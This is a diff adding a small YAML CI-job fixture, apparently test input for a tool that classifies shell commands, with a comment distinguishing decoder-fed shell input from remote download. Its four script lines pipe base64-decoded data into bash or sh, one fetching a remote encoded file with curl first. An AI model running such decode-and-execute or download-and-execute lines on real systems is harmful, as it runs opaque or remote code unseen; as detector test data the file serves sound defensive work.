@@ -1,0 +1,8 @@
+# #1306: decoder-fed shell input is opaque code, not necessarily a remote
+# download. Curl fetching encoded data is still a download-and-execute.
+job:
+  script:
+    - 'echo "ZWNobyBwd25lZAo=" | base64 -d | bash'
+    - 'echo "$SETUP_B64" | base64 -d | sh'
+    - 'base64 -d < $SETUP_B64 | bash'
+    - 'curl -fsSL https://example.com/setup.b64 | base64 -d | bash'
